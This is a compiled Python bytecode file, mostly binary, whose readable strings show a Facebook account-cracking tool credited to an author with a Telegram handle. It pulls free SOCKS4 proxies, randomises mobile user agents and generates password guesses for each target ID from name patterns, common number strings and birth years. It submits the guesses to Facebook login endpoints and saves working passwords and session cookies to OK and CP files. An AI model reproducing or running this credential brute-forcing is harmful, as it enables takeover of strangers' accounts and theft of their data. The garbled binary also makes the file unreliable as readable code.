a
    E��dW  �                   @   s*  d dl mZ d dlZd dl Z d dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlmZ d dlmZ d dl mZ d dlmZ d dlmZ d dlmZ d dlmZ d d	lmZ  d d
l!m"Z# d dlmZ$ d dlm%Z% d dl&m'Z( d dl	Z	d dlm)Z) d dlmZ d dl	m*Z* d dl	m*Z+ e%�,�  e� Z-e�.� Z.e.�/d�Z0e�.� Z1e1j2Z3e1j4Z5e1j6Z7g Z8g Z9g Z:e�;� Z<g Z=z e�>d�j?Z@eAdd��Be@� W n. eC�y� ZD zed� W Y dZD[Dn
dZD[D0 0 eAdd��E� �F� Z@eGd�D �]jZHdZIe�Jdd�ZKe�Jdd�ZLdZMe�Jdd�ZDdZNe�Jdd�ZOe�Jdd�ZPe�Jdd�ZQe�Jdd�ZRdZSeI� eK� d eL� d!eM� eD� eN� eO� d eP� d eQ� d eR� d!eS� �ZTe8�UeT� d"ZVe�Wg d#��ZKd$ZLe�Wg d%��ZMe�Jdd&�ZDe�Wg d%��ZNd'ZOe�Jd(d�ZPd)ZQe�Jd*d+�ZRe�Jd,d-�ZSd.ZXeV� d!eK� d/eL� eM� eD� eN� d0eO� eP� d eQ� d eR� d eS� d!eX� �ZYe9�UeY� �q�eGd1�D ]�ZZd2ZIe�Jdd�ZKe�Jdd�ZLe�Wg d%��ZMe�Wg d%��ZDe�Wg d%��ZNe�Wg d%��ZOe�Jdd�ZPd3ZQe�Jdd�ZRe�Jdd�ZSd4ZXeI� eK� d5eL� eM� eD� eN� eO� eP� eQ� eR� d eS� d!eX� �Z[�qfd6d7� ZTg g d d d g g g g g g g g f\Z\Z]a^a_a`ZaZbZcZdZeZfZgZhg Z:g g  ZiZjd8Zkd9Zld8Zmd8Znd:Zod;Zpd:Zqd<Zrd=Zsd>Ztd?Zud@ZZd9ZvdAZSd8ZPdBZwdCZxdDZyd<ZKdEZze�WeveSePexeKg�Z{dFdG� Z|d dHl	m}Z~ d dIlmZ� e�e~� dJ �Z�e�dKk�r e�dK ZIdLZ�ne�ZIdMZ�dNdO� Z�dPdG� Z|dQdR� Z�dSdT� Z�e�dG� e��  dUdV� Z�dWdX� Z�dYdZ� Z�G d[d\� d\�Z�d]d^� Z�d_d`� Z�dadb� Z�dcdd� Z�dedf� Z�e�dgk�r&ze��dh� W n   Y n0 ze��di� W n   Y n0 ze��dj� W n   Y n0 ze�dk� W n   Y n0 e��  dS )l�    )�BeautifulSoupN)�Table)�Console)�ThreadPoolExecutor)�Group)�Panel)�print)�Markdown)�Columns)�pretty)�Text)�date)�datetime)�sleepz%H:%Mzwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz	.prox.txt�wz. [1;91m[1;96m[1;97m [1;96m[Mr.IPYTHONI]�ri'  z!Mozilla/5.0 (Symbian/3; Series60/�   �	   ZNokia�d   i'  zl/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/�   zMobile Safari/535.1�.� zMozilla/5.0 (Linux; U; Android)�6�7�8�9Z10�11Z12z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Zi�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �0ih  i$  �(   �   zMobile Safari/537.36z; z) �
   z"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-SzC; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/zMobile WVGA SMM-MMS/1.2.0 OPN-B�/c                  C   s�   z*t dd��� �� } | D ]}t�|� qW n\   t�d�j}t dd�} t�	dt
|��}|D ]}| �|d � q\t dd��� �� } Y n0 d S )Nz	bbnew.txtr   zAhttps://raw.githubusercontent.com/PSYCHO-PICCHI/ua/main/bbnew.txtz
.bbnew.txtr   zline">(.*?)<�
)�open�read�
splitlines�ugen�append�requests�get�text�re�findall�str�write)�uaZub�a�aaZun� rM   �#/storage/emulated/0/abode@/abode.py�uakuY   s    
rO   z[1;97mz[1;91mz[1;96mz[1;93mz[1;95mz[0mz[1;30mz[41m[1;97mz[mz[93mz[32mz[96mz[33mz[0;34mc                   C   s   t �d� t�  d S �N�clear)�os�system�bannerrM   rM   rM   rN   rQ   �   s    
rQ   )�	localtime)rS   �   �   z	[1;91mPMz	[1;96mAMc                 C   s2   | d D ]$}t j�|� t j��  t�d� qd S )Nr=   g����Mb`?)�sys�stdoutrI   �flush�timer   )�u�erM   rM   rN   �
_IPYTHONI_�   s    r^   c                   C   s   t �d� d S rP   )rR   rS   rM   rM   rM   rN   rQ   �   s    c                   C   s
   t �  d S �N)�loginrM   rM   rM   rN   �back�   s    ra   c                   C   s   t dt � d S )Nu.  %s
	
   ꙰ ꙰ ꙰ ꙰ ꙰           ⚑             ⠀⠀꙰꙰ ꙰ ꙰ ꙰ ꙰
             CODE BY  : @𝐀𝐁𝐎𝑫𝑬
             Telegram : @hje00
             Version  : 1.0
           ╔╦══• •✠•❀𝐀𝐁𝐎𝑫𝑬❀•✠ • •══╦╗
           ╚╩══• •✠•❀𝐀𝐁𝐎𝑫𝑬❀•✠ • • ══╩╝
 
---------------------------------------------------------------------
---------------------------------------------------------------------
                                 
              
)r   r,   rM   rM   rM   rN   rT   �   s    �rT   c                  C   s@   t d� td�} | dv r.t�  td� t�  ntd� t�  d S )Nz[1;94m1 - CRACK FILE u)   [1;92m𝐂𝐡𝐨𝐨𝐬𝐞 :[1;97m )�1u^    [1;91m[1;96m[1;97m 𝔹𝕒 𝕤𝕒𝕣𝕞𝕒𝕨𝕥𝕦𝕪 𝕕𝕒𝕣𝕔𝕙𝕦 uQ    [1;91m[1;96m[1;91m 𝕙𝕒𝕝𝕥 𝕟𝕒𝕓𝕫𝕙𝕒𝕣𝕕𝕨𝕒 )r^   �inputr"   r   �exitra   )Z_____IPYTHONI_____rM   rM   rN   �menu�   s    re   c                   C   s   t d� t�d� t�  d S )Nz' [1;91m[1;96m[1;97m [1;91mGoto Menu�   )r   r[   r   ra   rM   rM   rM   rN   �error�   s    
rg   c                   C   s   t �d� t� ��  d S rP   )rR   rS   r    �plerrrM   rM   rM   rN   r"   �   s    
r"   c                   @   s   e Zd Zdd� Zdd� ZdS )r    c                 C   s
   g | _ d S r_   )�id)�selfrM   rM   rN   �__init__�   s    z
D.__init__c                 C   s�   t �d� t�  zHtd�}t|d��� D ]}t�|�� � q(t	dt
tt�� � t�  W n. ty�   t	d| � t�d� t�  Y n0 d S )NrQ   u;   [1;93mFILE name ادخل اسم وموقع الملف  :  r   z[1;95mTotal ID :  [1;97mu[    [1;91m[1;96m[1;97m [1;91m 𝑭𝑰𝑳𝑬 %s 𝑵𝑨𝑫𝑶𝒁𝑹𝑨𝑾𝑨[0mrf   )rR   rS   rT   rc   r>   �	readlinesri   rB   �stripr   rH   �len�Settings�IOErrorr[   r   r"   )rj   ZfileX�linerM   rM   rN   rh   �   s    

zD.plerrN)�__name__�
__module__�__qualname__rk   rh   rM   rM   rM   rN   r    �   s   r    c                  C   sD  t t� d�� td�} | dv rpg }tt�D ]}|�|� q*t|�}|d }t|�D ]}t�|| � |d8 }qRn>| dv r�tD ] }t	�
dtt��}t�||� q|nt d� t�  t d� td	�}|dv r�t�d
� n
t�d
� td�}|dv �r*t�d� t d� td�}	|	�d�}
|
D ]}t�|� �qn
t�d� t�  t�  d S )Nu    اكتب رقم 2u'   [1;92m𝑩𝑵𝑼𝑺𝑨 2 : [1;97m)rb   Z01r   )�2Z02r   uU   [1;91m[1;96m[1;97m[1;91m𝑯𝑨𝑳𝑻 𝑵𝑨𝑩𝒁𝑯𝑨𝑹𝑫𝑾𝑨u.   [1;91m[1;96m[1;97m[1;91m اكتب رقم 1z[1;92mChoose :[1;97m �mobileu�   [1;91m- password[1;96m                                                     [1;92mاكتب حرف A[1;92m
[1;96m𝐂𝐡𝐨𝐨𝐬𝐞 : [1;97m��yr5   �yaz'Add Password Manual Minimam 6 Characterz- [1;91m[1;96m[1;97m Add Password Manual : �,Zno)r   r$   rc   �sortedri   rB   rn   �range�id2�randomZrandint�insertrd   �method�pwpluss�split�pwnya�passwrd)�huZmudaZbacotZbcmZbcmiZxmudZxxZhcZpwplusZpwkuZpwkuhZxpwrM   rM   rN   ro   �   sB    




ro   c                  C   s:	  t d� t dt� dt� dt� d�� t d� tdd����} tD �]v}|�d�d |�d�d	 ��  }}|�d�d }g }t|�d
k �rt|�dk r��qJ|�	|� |�	|d � |�	|d � |�	|d � |�	|d � |�	|d � |�	|d � |�	|d � |�	|d � |�	d� |�	|d � |�	|d � |�	d� |�	|d � |�	d� |�	d� |�	d� |�	d� |�	|d � |�	d| � |�	|d � |�	d� |�	d� |�	|d � |�	|d � |�	|d � |�	|d � |�	|d � |�	|d  � |�	|d! � |�	|d" � |�	|d � |�	|d# � |�	|d$ � |�	|d% � |�	|d& � |�	|d% � |�	|d' � |�	|d( � |�	|d) � |�	|d* � |�	|d � |�	|d � |�	|d � |�	|d � |�	|d � |�	|d+ � |�	|d, � |�	|d- � |�	|d. � |�	|d/ � |�	|d0 � |�	|d1 � |�	|d2 � |�	|d3 � |�	|d4 � |�	|d5 � |�	|d � |�	|d � |�	|d6 � |�	|d7 � |�	|d8 � |�	|d9 � |�	|d: � |�	|d; � |�	|d< � |�	|d= � |�	|d> � |�	|d? � |�	|d@ � |�	|dA � |�	|dB � |�	|dC � |�	|dD � |�	|dE � |�	|dF � |�	|dG � |�	|dH � |�	|dI � |�	|dJ � |�	|dK � |�	|dL � |�	|dM � |�	|dN � |�	|dO � |�	|dP � |�	|dQ � |�	|dR � |�	|dS � |�	|dT � |�	|dU � |�	|dV � |�	|dW � |�	|dX � |�	|dY � |�	|dZ � |�	|d[ � |�	|d\ � |�	|d] � |�	|d^ � |�	|d_ � |�	|d` � |�	|da � |�	|db � |�	|dc � |�	|� |�	|d � |�	|d � |�	|dd � |�	|d � |�	|d � |�	|d � |�	|d � |�	|de � |�	|df � |�	|d � |�	|d � |�	|d � |�	|d � |�	|d � |�	|d � �n:t|�dk �r,|�	|� �n|�	|� |�	|d � |�	|d � |�	|d � |�	|d � |�	|d � |�	|d � |�	|d � |�	|d � |�	d� |�	|d � |�	|d � |�	d� |�	|d � |�	d� |�	d� |�	d� |�	d� |�	|d � |�	d| � |�	|d � |�	d� |�	d� dgt
v �rltD ]}|�	|� �qXn dhtv �r�| �t||� q>ditv �r�| �t||� q>djtv r>| �t||� q>W d   � n1 �s�0    Y  t dk� t dlt� dm�t � t dn� tdo�}|dpv �	rt�  n t dqt� d�� t�dr� t�  d S )sNz([1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~u&   [1;94m--░⌛░-- @hje00    [1;97mz[1;97m/[1;97mr   �   )Zmax_workers�|r   r   �   rV   Z1234Z123456Z1122Z	112334455Z123123Z12345Z112233Z
qqwweerrttZ11223344Z	123456789Z00998877Z12345678Z	firstlastZ
1122334455ZppooiiuuZqqwweerrZ123Z112233445566z
11223344@@Z1234567Z
1234567890Z0099Z009988Z
0099887766Z009988778855Z
0099887744Z009988774433Z0099887744332211Z121Z121121r   Z11223344556677Z1122334455667788Z112233445566778899Z11223344556677889900Z0987Z09876Z098765Z0987654Z09876543Z	098765432Z
0987654321Z1980Z1981Z1982Z1983Z1984Z1985Z1986Z1987Z1988Z1989Z1990Z1991Z1992Z1993Z1994Z1995Z1996Z1997Z1998Z1999Z2000Z2001Z2002Z2003Z2004Z2005Z2006Z2007Z2008Z2009Z2010Z2011Z2012Z2013Z2014Z2015Z2016Z2017Z2018Z2019Z2020Z2021Z2022Z2023Z2024�@Z1000Z123321Z12341234ry   rv   ZfreeZtouchuJ    [1;91m[1;96m[1;97m 𝑪𝑹𝑨𝑪𝑲 𝑻𝑨𝑾𝑨𝑾 𝑩𝑼 u"    [1;91m[1;96m[1;97m 𝑶𝑲 : z%s u�    [1;91m[1;96m[1;97m  𝑫𝑼𝑩𝑨𝑹𝑨 𝑩𝑼𝑵𝑨𝑾𝑨𝒀 𝑪𝑹𝑨𝑪𝑲 [1;97m[Y]
 [1;91m[1;96m[1;97m [1;91m𝑫𝑨𝑹𝑪𝑯𝑼𝑵 [T]u0   [1;97m 𝑯𝑨𝑳𝑩𝒁𝑯𝑬𝑹𝑨  : rw   uK   	 [1;91m[1;96m[1;97m 𝑿𝑾𝑨𝑻 𝑳𝑨𝑮𝑨𝑳 𝑩𝑹𝑨 rf   )r   �ha�bu�ta�tredr}   r�   �lowerrn   rB   r�   r�   r�   �submit�crackZ	crackfreeZ
cracktouch�h�okrc   ra   r\   r[   r   rd   )ZpoolZyuzong�idfZnmfZfrs�pwvZxpwdZwoirM   rM   rN   r�   �   s^   
"





















0

r�   c                 C   s�  t �ttttttg�}tj	�
dt� t� t� t� dt� tt�� t� dt� t� t� t� dt� t� t� t� d|� d�tttt�� �� d��f tj	��  t �t�}t �t�}t�� }|D �]}�z�t �t�}dd	| i}|j�d
d|ddddddddddd�� |�d|  d �}	t�dt |	j!���"d�t�dt |	j!���"d�| dd|d�}
d�#dd � |	j$�%� �&� D ��}|d!7 }d
d"dd#d$|ddddddd%ddd&�}|j'd'|
d(|i|d)|d*�}d+|j$�%� �(� v �rt)d,| � d-|� �� t*d.t d/��
| d0 | d1 � t+�,| d0 | � td7 aW  �q�n�d2|j$�%� �(� v �r�td7 a|j$�%� }d�#d3d � |j$�%� �&� D ��}t)d4| � d5|� d6|� �� t*d7t- d/��
| d0 | d1 � W  �q�nW q�W q� tj.j/�y�   t0�1d8� Y q�0 q�td7 ad S )9Nu   𝐀𝐁𝐎𝑫𝑬 �   •u	     • OK:u	    •  CP:u    • (z{:.0%}z  Zhttpz	socks4://zm.facebook.comrb   z�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-originZcors�empty�documentzhttps://m.facebook.com/zgzip, deflate brzen-GB,en-US;q=0.9,en;q=0.8)�Host�upgrade-insecure-requests�
user-agent�acceptZdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-dest�referer�accept-encoding�accept-languagez8https://p.facebook.com/login/device-based/password/?uid=z)&flow=login_no_pin&refsrc=deprecated&_rdrzname="lsd" value="(.*?)"r   zname="jazoest" value="(.*?)"z)https://p.facebook.com/login/save-device/Zlogin_no_pin)Zlsd�jazoest�uid�nextZflow�pass�;c                 S   s   g | ]\}}d ||f �qS �z%s=%srM   ��.0�key�valuerM   rM   rN   �
<listcomp>  �    zcrack.<locals>.<listcomp>z  m_pixel_ratio=2.625; wd=412x756�	max-age=0zhttps://m.facebook.com�!application/x-www-form-urlencodedzlhttps://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F�r�   zcache-controlr�   �originzcontent-typer�   r�   r�   r�   r�   r�   r�   r�   r�   r�   zChttps://p.facebook.com/login/device-based/validate-password/?shbl=0ZcookieF)�data�cookies�headers�allow_redirectsZproxies�
checkpointub   [1;91m 
~~~~~~~~~~𝐀𝐁𝐎𝑫𝑬-𝐂𝐏~~~~~~~~~~ 
└──𝑰𝑫 𝑭𝑩 𝑪𝑷: u.   
└──𝑷𝑨𝑺𝑺 𝑭𝑩 𝑪𝑷: �CP/rK   r�   r=   �c_userc                 S   s   g | ]\}}d ||f �qS r�   rM   r�   rM   rM   rN   r�   (  r�   uZ   [1;92m 
~~~~~~~~~~𝐀𝐁𝐎𝑫𝑬---𝐎𝐊~~~~~~~~~~
└──𝑱𝑫 𝑭𝑩: u%   
└──𝑷𝑨𝑺𝑺 𝑭𝑩: u-   
└──𝑪𝑶𝑲𝑰𝑬𝑺 𝑭𝑩: zOK/�   )2r~   �choicer,   r�   r6   r*   r+   r1   rX   rY   rI   �b�looprn   ri   r$   r�   r)   �cp�format�floatrZ   rA   �ugen2rC   �Session�proxr�   �updaterD   rF   �searchrH   rE   �group�joinr�   �get_dict�items�post�keysr   r>   �akunrB   Zokc�
exceptions�ConnectionErrorr[   r   )r�   r�   ZborJ   Zua2�ses�pwZnipZproxs�pZdataaZkokiZheadeZpoZcokiZkukirM   rM   rN   r�     sD    t




(:$ 

 
r�   c                 C   s�  d}ddddd|ddd	d
dddddd�}t �� }�z&|�d�}t|jd| |dd�|dd�jd�}|�d�}i }g d�}	|d�D ],}
|
�d�|	v r~|�|
�d�|
�d�i� q~t|jdt|d � ||d�jd�}t	dt
| |tf � tdt d ��| d! | d" � td#7 a|�d$�}t|�d%k�r6t	d&ttf � n |D ]}t	d't|jtf � �q:W nr t�y� } zXt	dt
| |tf � t	d(ttf � tdt d ��| d! | d" � td#7 aW Y d }~n
d }~0 0 d S ))Nz~Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36:;]�mbasic.facebook.comr�   rb   �https://mbasic.facebook.comr�   �|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r�   r�   �navigate�?1r�   �:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8�gzip, deflate�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7r�   �%https://mbasic.facebook.com/login.phpr�   �Zemailr�   r`   T�r�   r�   r�   �html.parser�form�Znhr�   Zfb_dtsgzsubmit[Continue]Zcheckpoint_datarc   �namer�   �action�r�   r�   �%s++++ %s|%s ----> CP       %sr�   rK   r�   r=   r   �optionr   z5%s---> Tap Yes / A2F (Check  Login Id Lite/Mbasic%s)�%s---> %s%sz:%s---> Cannot Check Options (Check Login In Lite/Basic)%s)rC   r�   rD   �sopr�   rE   �findr�   rH   r   r�   �xr>   ZcpcrI   r�   �find_allrn   �hh�kk�	Exceptionr\   )r�   r�   rJ   �headr�   �hi�ho�jor�   �lion�anj�kent�opsi�opsii�crM   rM   rN   �ceker3  s4    $
"
$ 
 r�   c                  C   s2  t t�} d|  }tt|dd�� ttd t d t d � d}t� �t	|dd	�� d
}tD �]�}�zjz"|�
d�d
 |�
d�d  }}W nD ty�   t�d� tdt|tf � tdttf � Y W q\Y n0 t�ttttttg�}td||t t�|tf dd� tj��  d}t�� }	ddddd|dddddddd d!d"�}
|	�d�}t|	jd#||d$d%�|
d&d'�jd(�}d)|	j�� � � v �r�z�|�!d*�}i }g d+�}|d,�D ]0}|�d-�|v �r�|�"|�d-�|�d.�i� �q�t|	jdt#|d/ � ||
d0�jd(�}td1t||tf � |�$d2�}t |�d
k�r0td3ttf � n |D ]}td4t|jtf � �q4W n0   td1t||tf � td5ttf � Y n0 n>d6|	j�� � � v �r�td7t||tf � ntd8t||tf � |d7 }W q\ tj%j&�y   td9� d:}t� �t	|d;d	�� t'�  Y q\0 q\d<}t� �t	|dd	�� t'�  d S )=N�#zCEK OPSI)�title�[r�   z] INPUTz# PROSESES COZgreen)Zstyler   r�   r   rf   z%s++++ %s ERROR=-     %sz2%s---> Separator Not Supported For This Program%sz%s---> %s/%s ---> { %s }%sr   )�endz{Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36r�   r�   rb   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   Tr�   r�   r�   r�   r�   rc   r�   r�   r�   r�   r�   r�   z2%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)r�   z%s---> Cannot Check Options%sr�   z%s++++ %s|%s ----> OK       %sz"%s++++ %s|%s ----> ERROR       %s� u.   #𝑿𝑨𝑻𝑨𝑲𝑨𝑻 𝑩𝑹𝑨𝑨Zredz# DONE)(rn   r�   �cetak�nelrc   r\   r�   �solr   �markr�   �
IndexErrorr[   r   r�   r�   r~   r�   �kr�   r�   rX   rY   rZ   rC   r�   rD   r�   r�   rE   r�   r�   r�   r�   r�   rH   r�   r�   r�   rd   )r�   r�   ZcekZloveZkesri   r�   ZbirJ   r�   �headerr�   r�   r�   r�   r�   r�   r�   r�   r�   ZliZdahrM   rM   rN   �cek_opsiP  sj    
"
($
"
$
r  �__main__ZOKZCPZDUMPztouch .prox.txt)�Zbs4r   r�   rC   ZjsonrR   rX   r~   r   r[   rF   Zurllib3Zrich�base64Z
rich.tabler   �meZrich.consoler   r  Zconcurrent.futuresr   r�   r   ZgpZ
rich.panelr   r  r   r   Zrich.markdownr	   r  Zrich.columnsr
   ZcolZrprintr   Z	rich.textr   Ztekzr   r   ZwaktuZinstallZCONZnow�strftimeZ	dt_stringZcurrentZyearr�   Zmonthr�   Zdayr�   r�   rA   Zcokbrutr�   r�   ZprincprD   rE   r�   r>   rI   r�   r]   r?   r@   r|   ZxdrK   Z	randranger�   r�   �d�f�gr�   �i�jr  rO   rB   rL   r�   �lZuaku2r�   Zuakri   r}   r�   r�   r�   r�   Zoprekr�   Z	lisensikuZ	taplikasiZtokenkur�   Zlisensikunir�   r�   ZBMr,   r)   r$   r'   r   r1   r+   r*   r6   Zsir�mr�   r\   r�   r�   ZasurQ   rU   �ltrS   �cmd�intZltx�tagr^   ra   rT   re   rg   r"   r    ro   r�   r�   r�   r  rr   �mkdirrM   rM   rM   rN   �<module>   s  H
<
B>8


&  (;
